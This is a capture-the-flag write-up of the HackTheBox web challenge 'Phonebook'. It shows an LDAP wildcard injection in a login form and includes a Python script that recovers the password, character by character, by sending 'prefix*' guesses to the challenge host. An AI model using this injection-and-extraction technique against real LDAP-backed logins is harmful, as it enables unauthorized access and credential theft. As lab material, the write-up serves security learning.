# Phonebook
Phonebook is a HTB web challenge that leverages on bruteforce attacks to find the correct username and password.

# Exploit
Using ```*:*``` as the credentials, we realize that we are able to login to the webpage. However, an invalid ```a:a``` will not allow us to login to the site.

From the webpage, we can also see that a user Reese is telling us that we can login using the workstation username and password/
![user Reese](https://github.com/joelczk/writeups/blob/main/HTB%20Challenges/Images/Phonebook/login.png)

Afterwards, we will try using ```Reese:*``` to login and we realize that we are also able to do so. Apart from that we also realize that ```Ree*:*``` also allows us to login to the site as well. This is likely some form of pattern matching which can be exploited to allow us to find the password.

We can get the flag by writing a script to automate the bruteforce of the password to get the flag

```
import requests

wordlist = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","#","$","%","@","!","0","1","2","3","4","5","6","7","8","9","{","}","[","]","_","&","^"," "]

username = "reese"

def checkLogin(username, password):
    data = {'username':username, 'password': password}
    resp = requests.post("http://157.245.44.97:31657/login", data=data, allow_redirects=True)
    if "<title>Phonebook - Login</title>" in resp.text:
        return False
    else:
        return True

def checkWord():
    finalPassword = ""
    while True:
        for x in wordlist:
            testPassword = finalPassword + x + "*"
            print("Testing : {}".format(testPassword))
            if checkLogin(username, testPassword) == True:
                #print(testPassword)
                finalPassword = testPassword.replace("*","")
                print("Found:{}".format(finalPassword))
                break
            else:
                continue
        if "}" in finalPassword:
            print("Final flag: {}".format(finalPassword))
            break 
checkWord()
```

# Explanation
Upon some googling, it is discovered that the site is likely to be using LDAP Auth where a search query similiar to the one below is being used to authenticate a user. As such, ```*:*``` would allow anyone to be authenticated onto the web interface.
```
ldapAuth.dnResolution.searchFilter = (uid=%u)
```
